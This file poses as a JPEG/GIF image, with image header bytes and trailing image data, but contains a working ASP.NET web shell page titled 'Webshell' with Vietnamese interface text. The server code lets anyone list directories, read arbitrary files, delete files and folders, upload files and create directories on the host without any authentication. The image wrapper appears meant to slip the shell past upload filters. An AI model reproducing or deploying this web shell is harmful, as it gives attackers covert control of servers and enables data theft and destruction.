ˇÿˇ‡ JFIF      ˇ€ C 		

 $.' ",#(7),01444'9=82<.342ˇ€ C			

2!!22222222222222222222222222222222222222222222222222ˇ˛GIF89a;
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webshell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f4f4f4;
        }
        h2, h3 {
            color: #333;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        li {
            margin-bottom: 10px;
        }
        a {
            text-decoration: none;
            color: #007bff;
        }
        a:hover {
            text-decoration: underline;
        }
        pre {
            background-color: #eee;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
        }
        .actions {
            margin-top: 20px;
        }
        .actions form {
            margin-bottom: 10px;
        }
        input[type="submit"] {
            background-color: #28a745;
            color: #fff;
            border: none;
            padding: 8px 16px;
            cursor: pointer;
            border-radius: 4px;
        }
        input[type="submit"]:hover {
            background-color: #218838;
        }
        input[type="file"], input[type="text"] {
            padding: 8px;
            border-radius: 4px;
            border: 1px solid #ccc;
            width: calc(100% - 20px);
        }
        .error {
            color: #ff0000;
        }
        .success {
            color: #28a745;
        }
    </style>
</head>
<body>
    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            try
            {
                string directoryPath = Request.QueryString["dir"];
                if (string.IsNullOrEmpty(directoryPath))
                {
                    directoryPath = Server.MapPath("~/");
                }

                if (!string.IsNullOrEmpty(Request.QueryString["delete"]))
                {
                    string deletePath = Request.QueryString["delete"];
                    if (Directory.Exists(deletePath))
                    {
                        Directory.Delete(deletePath, true);
                        Response.Write("<p class='success'>Thu muc da bi xoa: " + deletePath + "</p>");
                    }
                    else if (File.Exists(deletePath))
                    {
                        File.Delete(deletePath);
                        Response.Write("<p class='success'>Tep da bi xoa: " + deletePath + "</p>");
                    }
                }

                if (Request.HttpMethod == "POST")
                {
                    if (Request.Form["newDir"] != null)
                    {
                        string newDirPath = Path.Combine(directoryPath, Request.Form["newDir"]);
                        Directory.CreateDirectory(newDirPath);
                        Response.Write("<p class='success'>Thu muc moi da duoc tao: " + newDirPath + "</p>");
                    }

                    if (Request.Files["fileUpload"] != null)
                    {
                        HttpPostedFile uploadedFile = Request.Files["fileUpload"];
                        string savePath = Path.Combine(directoryPath, Path.GetFileName(uploadedFile.FileName));
                        uploadedFile.SaveAs(savePath);
                        Response.Write("<p class='success'>Tep da duoc tai len: " + savePath + "</p>");
                    }
                }

                string[] directories = Directory.GetDirectories(directoryPath);
                string[] files = Directory.GetFiles(directoryPath);

                Response.Write("<h2>Thu muc hien tai: " + directoryPath + "</h2>");
                Response.Write("<h3>Thu muc:</h3>");
                Response.Write("<ul>");
                foreach (string dir in directories)
                {
                    string dirName = Path.GetFileName(dir);
                    Response.Write("<li><a href='?dir=" + dir + "'>" + dirName + "</a> - <a href='?delete=" + dir + "' style='color: red;'>Xoa</a></li>");
                }
                Response.Write("</ul>");

                Response.Write("<h3>Tep:</h3>");
                Response.Write("<ul>");
                foreach (string file in files)
                {
                    string fileName = Path.GetFileName(file);
                    Response.Write("<li><a href='?viewfile=" + file + "'>" + fileName + "</a> - <a href='?delete=" + file + "' style='color: red;'>Xoa</a> - <a href='" + file + "' download>Download</a></li>");
                }
                Response.Write("</ul>");

                if (!string.IsNullOrEmpty(Request.QueryString["viewfile"]))
                {
                    string filePath = Request.QueryString["viewfile"];
                    Response.Write("<h3>Xem tep: " + Path.GetFileName(filePath) + "</h3>");
                    string fileContent = File.ReadAllText(filePath);
                    Response.Write("<pre>" + Server.HtmlEncode(fileContent) + "</pre>");
                }

                Response.Write("<div class='actions'>");
                Response.Write("<form action='' method='post' enctype='multipart/form-data'>");
                Response.Write("<h3>Tai len tep:</h3>");
                Response.Write("<input type='file' name='fileUpload' />");
                Response.Write("<input type='submit' value='Tai len' />");
                Response.Write("</form>");

                Response.Write("<form action='' method='post'>");
                Response.Write("<h3>Tao thu muc moi:</h3>");
                Response.Write("<input type='text' name='newDir' placeholder='Ten thu muc moi' />");
                Response.Write("<input type='submit' value='Tao thu muc' />");
                Response.Write("</form>");
                Response.Write("</div>");
            }
            catch (Exception ex)
            {
                Response.Write("<p class='error'>Loi: " + ex.Message + "</p>");
            }
        }
    </script>
</body>
</html>


</head>
<body>
    <form id="form1" runat="server">
    </form>
</body>
</html>
ˇ¿  ® ·" ˇƒ           	
ˇƒ µ   } !1AQa"q2Åë°#B±¡R—$3brÇ	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzÉÑÖÜáàâäíìîïñóòôö¢£§•¶ß®©™≤≥¥µ∂∑∏π∫¬√ƒ≈∆«»… “”‘’÷◊ÿŸ⁄·‚„‰ÂÊÁËÈÍÒÚÛÙıˆ˜¯˘˙ˇƒ        	
ˇƒ µ  w !1AQaq"2ÅBë°±¡	#3Rbr—
$4·%Ò&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzÇÉÑÖÜáàâäíìîïñóòôö¢£§•¶ß®©™≤≥¥µ∂∑∏π∫¬√ƒ≈∆«»… “”‘’÷◊ÿŸ⁄‚„‰ÂÊÁËÈÍÚÛÙıˆ˜¯˘˙ˇ⁄   ? Tå≥ÖœZµ$e0õ˙
í¬,À∏ˆ´1«Á\ìåÅHª"®´ø9Áä∫∂ª w^M1∆Îê [∏êã,2ÌJE$bÃw99œ594•…$POÁLÅÒÇsN*H¶#Ì „•LÓUÉm4çù≠”÷ù$eG∑≠1‘ÁßëK√' „+Ô@ ÉJß1;¢‰Å‘Á≈ .A·∫˚≥“AÛ/#ﬁ®ù√≠>9 q˙P5RÂY≥ ›pzI%éPD®≥˜Ä™ﬂ$Îî_3Mfï0í&G≠"ÆHˆá¢`ÎÌUYYN«÷•cl£b•{Ñò"ÛÍ)ÅMd1∂EN'V∆ÙQMö‹„rú©Ù™¡à‡–#TG…√ÈÎY◊4NhIJú©≈N”âP´é}hà‚ùú—"m4¡≈EE&( ≈!•£n(ßm¢Ä4‡FKb˛`ˆ´0ä˚«LÙ§íQaæ¥∑Øv˚PízR,ß••''”˚õù–‡ëÌUõwîº„<–I1wÎLW ú˙”ä˚”Ç†“sÌA#X`U∏@öﬂZ¶‰‚•∑fÜUŒ0h)-·∑ñ«ÈM∏≥d„ßZ|ä—HH«QZv‰^«Üu°§0cë‡`A≠íµƒòWı•æ”öX|¬≤ ≤`[π∞í!êw'®Ê™4x‰~µ<WÚƒ ŒW–‘˘ä·épÑÚ1“Å„ê°‚¥°ΩI#Ú‰Psﬁ™MhÈ çÀ◊äÆTÅëü•Z76@'ô ı™8?ç›:d„ΩYÛ‚∏Xn∆Åª£≤gõ"	9{¬S$èZàŒÄ! ©«zPƒu©ÊÎ÷° ÉÕ$'p®èZ\‚ÉÕbfù∫ôE 8“dé‘g©x=®7{QKèj(y<¶∫,Uvéÿ™óN¨>S¡nï0ëñ›úñ>µVG‹#ä#ùÅu
w =ÕC#î‘á"‹˝ií=¿'≠@:ööCò´)9<–∑ﬁ´≤¡õDïzÅTNK‚∑¨#I¨y8#¥ôqW(C û-æÈMÜw¥ò0Èﬁ£πâÏÓH:ÉNr≥G∏u«"Ålt	q‹YI«›Ù¨+ÿ6H›π‰UhÊ{v í*Èí+»Ú?÷˙Q`l e*qJéÜ•ëNpF1P˙ÉLEàÆô9ö9N]@'©≥˙RÜ9†R@ΩPÜ_aSN0ÎNﬁ≠÷Ä&t4§¨úÙ4å¶«J)b4ÑndÙ4ù9iRûh†‚åR—@Ñ≈•´ZõÖ>[Æ·¸$‚Å§W¢ß˚ﬂ›˜’\,ZöCÂ"#å’gcπx<
Y%v<ˆ„•B]ãg⁄Ä∏n˘è•LcΩ@	¡•v@ô≥nû∆™‰’Ñb–c–‘ÅàÅ0›úV∂õtbÑßîÓÁÅúVu¨
qtë)¡cäÓtü	»'Ú‰WQsjÔÇ :RmB-Ïr◊◊6˜
CnFÍ2Ω+-$(‹t´zÖªEr¿©©l9∆(Hóæ§≠µ«›õÅ>ÿ§S”öµ€îc@∑LrxjäXsD∞ºµÅ	750±‹é)Ò'ké=}) w-L±¨Îî·«Q@«µ´® a÷¢0ØNQΩ
I“[ù¨ºUªKG‘±î =i◊ÿÃuhœ$~ı©Ø≠ÕΩ¡B•qû
V ìLDπòWn-2‚hLëÆ@®$éHNŸ©˜†,»hßûE6Å%&h›@\Zr±Sï84Õ‘@ÆKÊø˜èÁEGö(ìÓr	≈B_ìöÌ⁄∆+o¨+l“€4åƒs€ö‚Jº˙RNÂJ->Ì Ëi1≈äd‹±»eı}‚(F⁄‡äÔrKiZ+Ñu8e9Ω€¡ZΩÆΩßY&Qol¶#	^çè¿ödp˜≠;;ª≠6·fÜGâ¡·Ö&Æ\%cﬁºEñZ·Æl&ç7ù∆6„ÿ÷=ß¡W
us ?6„\≠á≈ùn∆J≤„¶H¶j<E|¨ëJ∞!Ëju.Ëõ‚/Å¥›
[	î01ñ…>ıÊ±´#>Úú‚∫àc‘uyƒ◊/$•òí['5uº}zÍˆV≤<ûÅN
À`î[’#.⁄Õux¢ñê  ’
[√z¶éÓÏÊä7˚ÆÀÄk”<-°^xj{mm 3€d•‹%>xNy8ˆØeüN”ºE•ñ(ÁÇd»»» ‘ÛPIj|oí*Hér∂ΩO«?Ótü2˚IÃ÷Ÿ$√¸H=ΩkÀ^ﬁH…Oj”πìM≤\Æ…@W˜≠mg”Øí{véPá-û∞-•\ÏóßcÈ[6÷7Gj€ÒœΩ∏nvzáÉ·)gΩ“‚€3Ω≥¨çﬂØ}*•á¡ˇ Àr¢k!{πgëqèŒ≥¥ˇ Íz$†‡Ü_Ô
‹ó„FØˆ}ã[ªµJπRj˜;ª›#CóÜEº¬&uRr¿Õ^´›Ews+" π8¨jﬁ&‘ºA9733ì—GJß&ùqooÊNåªÅ#"òõ∫–≈‰3ü≠)Íi*ÃFöJ	¢ÇBäANö‚QR˘-Í?:(’ÔÙÎô¸Qsß¢©ä+o$-FN‹û3Ô÷∏>Y⁄˛£)c¿œW•«ß¿>!\∆◊ÏYdco÷π˝/K¥_j6s ãm=Ç1œ°®ÿÍjˆ<Ìî®9¶Z:ÕöÿÍWVÍ·ñ9TéÑgäŒ UúÕX)Ãr¶—@∆•¢»˛^°‡øÈ˛(éKK°± ç≥œΩyﬁçKsÂ»2áìÙÔ^√·m:mCwn7˝ö]íéõ£nUø#YÕù÷çåº¯
3∂Î;ÙŸÿ2ˇ ıÎS√ü°≥∏Yµ)ƒÿ?p+◊l¶YÌ£í2
∞»>’fÑØ‘Õ œc6√C∞”‡X†µâT *Ú¬ä0G–T·x84ò5J(M∂g6óùÊçô8êvo≠U¥“[Kùæ∆OŸd9h;#zØ∑®≠≤))r†Áv±âØBK∏›ˇ <€˘WŒ¶õó-ê˝Gz˙Oƒ
∑H∫>ë7ÚØü/·ë.eWPHb#•fÙgE$úKæ&ë‚û+óuôpU£8 }+l¸)’4{ïìN∫K®»W]~ùçG‡Kü≤kqÓ/Økån@qOV˜—Â“¯ÀXÄ-˝°∑πíΩ∏¨;èÇêÔ&;¬Ë
◊∂<JOÃ¢£h◊8‚Ñö2sπ‰⁄o¬ù;M€$ÌÊ∏<`b±>"È∞YÈ,!]°9¸´⁄¶@ÒÕxÔ≈…<Ω8®«ŒÍπı«4∫ó]3ƒÔJså6)µπÃ∆(4S$)sIF(o4—Q—Hu˛Ãe¯≠%ìOˆ]€JûÈT¸E·ŸtﬂÈ”
§^F»YWç¿˙™+ôµ$¯üoq-∂'x‘cêO G≠u^.“µ+Ì>•ÅÑñí¨™Tíqú0ÎËJÉ™˚'„Ck‚»Ú=¿5œ`◊mÆXM'äÊÇQì"Ú∫˝kèª∑{[áÜAÜSÉTå¶µ ≈>0ãûô¶“ßZdYÀßÍ6ÏŸÚÂ¡GÏ¿Ò_Cx %˛ëÂ…ÿ`ê¯‰~Ñ◊ú¯k@ˇ Ñ≥√›Bâ†9Ö«ﬁVÍ?Õz_√‰ûœàƒ“Â][Ç≤Ø?f∞ìª±‘ï£°◊È1õmì&2}=+cµB–â0O^†˙ôAö“*»ÁnÏ~qö2i3FqLBÛäNúÊå–y¿∆Ò#ï—/ˇ ûM^qs/€^f'xbNkﬁ|KìDª ıå◊Åj
òÁ'<˝knu—¯K:u˝ƒWhˇ h`‰œz˜Õ&Ë›ÈÃÄé+√¸/§…´ÍDâï-ûÄz◊πÿ⁄≠ù¨pØ›U Sé‰◊j÷'<ı®Ÿsœ1
∂ér¨™ $‚º„Î%ı•†<¸Œ√Ù÷ΩÀS∫éŒ÷Id`Túìä˘£∆ö¿÷u©.Bë]™O¶j:ó£g7˙÷«Æ*1Orúz”3[1ùÈhr€MûÊ÷Y„RV?÷ù…IΩäu"™≤ëŒGJååøßƒ≤∫2⁄ﬂC–“E.(ÆØ˛â}Ê(•rπYÎ>7?ÿﬁ8–.ûÊ_ﬂ7ñÕ« ﬂ*ıh°Ûm∏ïéGZÚˇ ä⁄}¨÷V7L≥oÇ|…'ë€ÚÆ„@ºÜ]€pEr≤FGCI-bôÊû0“àöyyÀπPÖÜ3ûGı¡|F—çé£
–bﬁrïræßÙ≈zßƒk4g≤’í9ãYH≤∂˝¬Fx¸´îÒÓóˆª…£äR%¬Ÿ Ü ˛4∂fõƒÒıF|‡g4Ä÷æÖl.5X·*X8aÄzjùıúñ7≤C"êQ±œ•Uı±è+µœC¯S≠≠é≥
Jqüªlûzœ˘◊“1¡ëÓU ìª#◊÷æ>—†∫8˛=´Èø¯ë5ù)‹}¢ «ØΩGSGwùx8‡‘î¡“ú*å≈¢äZ`G,âlÓp™2x™ˆöç•Úñµ∏I@Î¥Ù´dgÇ8™CK∂K¡u˘r„WÄ√‹Rw∑Rßà[=»…∆@«ø‰v˛ø‘Æº†ÀÛeîπ∆}Î€f¥ä· ªÄ9¡ß,«Äà™°∆Ï∏TÂV0º3·ã}ƒ"·•ndS[ÿ‚ûbå
¥¨Cmª≤*ägX–ªSªRIØ.Ò«åwy∫}õ0^VIaJN≈BLƒ¯Ö‚—®ô4˚9?—£8í@~˘Ù’„˙£ÉºÇNÍË.ã|ÂçsZàƒLOÒ)ER…YÁ≠'jô„€üZdkæE_SZ‰`d◊∏|;O€º8≥LH©aÜ∆	ˇ ÎWéivç{®√n†ì#ÅÅÈ_[¯b“;=ﬁ=ªx∆:Rzªus6¯Û¡>øÛìk)˘HÁ“πù2dÇı<ﬂılv∏ˆØ≠|K·ª-sMñ⁄·’îÁÊ?Ö|≈‚Ø
]xkRx§çÃùíF˙Ùyæ“;ﬂ±[ˇ –U?ÔÌ‰˛c}ˇ Ô™)Yè⁄G|EÛc“%Êi7â˜Tú~x≠/ ‹=ﬂÖ …ìrçØí{?•tz¶úöçÖ‘R'2°NPp1\◊Ñ,Á“Óı:P·#ë]0aÙıé†ù„bÊ¶aº∏}.·ﬂm‘,†ÚΩ˝ª÷F£c,⁄=åW…ò⁄÷`z∑˝c˘÷ﬂà,€PÚúµ¥ ÃBÚQæV˝
óZäﬁ˚EíSºògÓÉ¸≥CE'k:ËQ
3«–Lprá?àµÒ#√Ê›‚øÜ6æY08ˆ4ﬂY•èç„ûﬁ2¢P≤:êz˛ÇΩf„M∑ÒOÖ¬MúÌw˛x®ñÈö+Z«ÄŸDc0Måá\JÎº=Æ›ËzÑs¬€@ OwïØÿaû÷u"Í÷r#åˇ ßÎOVåƒeòûù
‹∏´h})†Îv˙÷üÃ,x#?t˙V¿9Øú¸+‚´ùÙmÀF~ÚìÄ√¸kﬁtmbﬂW≤éÊ›¡Vé„ÿ”ãËÃjB⁄≠çPi3ä@sUÔ#ûhY úBÁ¯ˆÓ≈UÏfâÃ® ~¥°ÅØ<ü√íΩÚ=ˆ•u2 ÏõÉlÿŸ„Û¨çV?xbÒ ˙‚‚ﬁCÖ3ÉËj9Õ}í{3◊ÕÊñ0Òlﬁyêß˙÷¨4· äˆ÷Ê“L‡áL‚ü:'Ÿ»ÌÈ≠¿ÕdZ¯üGº∫øá=pÕÉ˙÷~∑„7NÅÇN≥Kéy¶‰¨%	7k<i‚_Ï¯
¨
˚ÁüÓèÒØæ∏iª±=
_’µ)µô.$lóbqXwH€…zœs©.XŸ¶o6O/8……˙zV>•k$∑0¬ΩX‡WGih“H âÌ].ó·&π◊•wm•∫Ø#˛Z0œÈöÆk·}œ*‘≠ƒT"´ÿ≈æf$®Õ˙Vœâ`0]ÀAŸ!UM—^  ¬@Z¥Ù0q˜¨u_
thÔºL≥ ÿHFAı5Ì⁄˚«≤”O∂ºh¶ñd$+s∞G„^{ÍQ°xuo&Hñ63≥;«≠xw^º÷|u≤»çÁ·8¬ ËÁJÂÚŸ∂àMõ1êÂπÎå
„¸]·[¡ã´ßT-µW<}kæB¯€±xt≈FÒI$Äºqêß# Uÿ¡J«à¬ì≤ˇ ü˚ü˚È¬ä˜(œ(ø!E2Ï5Á@÷.zv¨…C
RƒÒ ò›p2OQ˘s˘‘–ÓïwÇÍÕ‘î«Èä∞ñ·∆‰	ÿ£¨B◊v“√π0Ò2c»5â·ùAı-Ï◊GÁƒcøŒ?œJÍÆb& ûWó√<⁄éßÑ»EΩ–Û €¬ÁıÕ&i
Uå_iˇ h”¥Î›¿œn íïÏ?àÆ∑·Â‘_ŸsÈm /nÁØu'¸jÆ÷’/5ùió3GˆãrTck~õ?ùTüÌ^ÒπfSÄ]F9\ q«b3P—∂Í√º·%7#W∑LÂ|ªÄΩ«∑‡q^u(6”¡W—6Û€Í⁄ht+,Nº°ÖxØä¥ì¶j◊Ï!3îœu5M›YÓsm¥ß_~+¬ﬁ'º–.‘∆Â·cÛ!<˛Ωa`‡Ù¶1`ÿ m=Èî}7£j–jˆQ‹@Ÿ9®ˆ5§FGJ˘ˇ ¡˛.üCΩDëÀ[1√È˛5Ózfßo©⁄%≈ºäÒ∏» ’'‹Áú9]÷≈ÿZ‡›€(Jâ#_Ã
öÍ»^ÈÖrË–÷ÑÉ˜±˛#Ùßæ6RÂ1„◊æ3÷¥+â,DL.Ê\í;¡‘|]®jã∂·‚#9À¨|@∏IºO7ñÑlzÅ\ö0,x8ÈSc•w-I1G‹ì…≈}ÎÚ1ı5¿Ù»™¶Wi6Å◊®®∞Ó…§îÔ⁄:‘°F9#'ú‘!⁄~¶≠€áë’<Ω {ÊÅ#´~Ñóóñs0 Óe>ÍØâ¸´—¥ç%`≤∫ë áûÍY˚*ø¯Íä°·m!¥›œxÇÃÒ≥ OBGÀüÀıÆûﬁ—¶ñ7p…36‹ƒÙ'Û4„ôTû∫'„ˇ %Üç®j!√ d?ÖI‚∏ØË◊7öV£Â#≤Gë‹ì˜GÁ^ÒÒ4Y¬1wå‚[Ñ(äçÇÁﬂÿWóH¥ì√”O'úå.ãd9˛ß˙~ïV∂ÇZ˚ÃƒÒƒ¢Ë6⁄\2Q$@ (<˛5°´Eû„UmIÑõR ®Ïw9#°∆8¨=_D∏Ò'ã•í·⁄Ieü∆á¢Á'–˙W∫ËEæóV—ó	onë…$ÒıÏ)ª-Mà·*∏…·	œﬁ;}?…©F=çIÄ}kCòè…ÙTòÌQ@î:´∆‰lGÉ≤Üœ∂>µ¶5DYèÊP:ÜQRôm"ã˜#!°‡f@+ÉÒ›´…oÏQç÷Ìñuê‰Æ}Ω
PÀÜá'u≠›
WJ’„åF·Lesªx:Ë<O&≠¢⁄Íˆ»p2¿∑+ûﬂ\ÒE&Ü6Å„G√Úîk`ˆ•â1ó∆>Ü∂<Q©€xèH[€DS,?Î∂^˘ÕT»∏-nyÃó$e<±ú‰rF?JèŒcΩD`„ø#'ÈEÏ'~‰Qœ!LîÁg5Ÿx7∆7:·&˘†v˘–úqÎÏh¢Üääæåˆ›/Y≥’!0Nç·yÔﬁ™¯õƒi\≥	§∆wZä)_C(≈sÿ˘˛˛ÈÆ/§ë‹bK›œ52í~p=y¢äGCdlÒô0èézöÅ)¡é˘ÎE1\¥“™∂ß®<Uù2ˆﬁﬁ˛9$;’X1Q‹‘Q@^ÃˆOkm´‹oöX÷5\¨@=3Ík´ª‘≠ÌbcÊ!p3∑pÈE§v9¶Ω„Œo!Okkˆ©PFá'¿OO∆≥ hΩ”ÌÓ%kŸ¢^z.z˛X¢äF±Ïj|=∞µY.5Kôê;æ»˜∞˙±ı5ÈkyjƒX˚‚ä)«cøˇ µ[œ⁄"€˛¯§˚u†Îs˝ˆ(¢™Êv"˛’”ˇ Á˙ﬂ˛˛èÒ¢ä(#ˇŸ
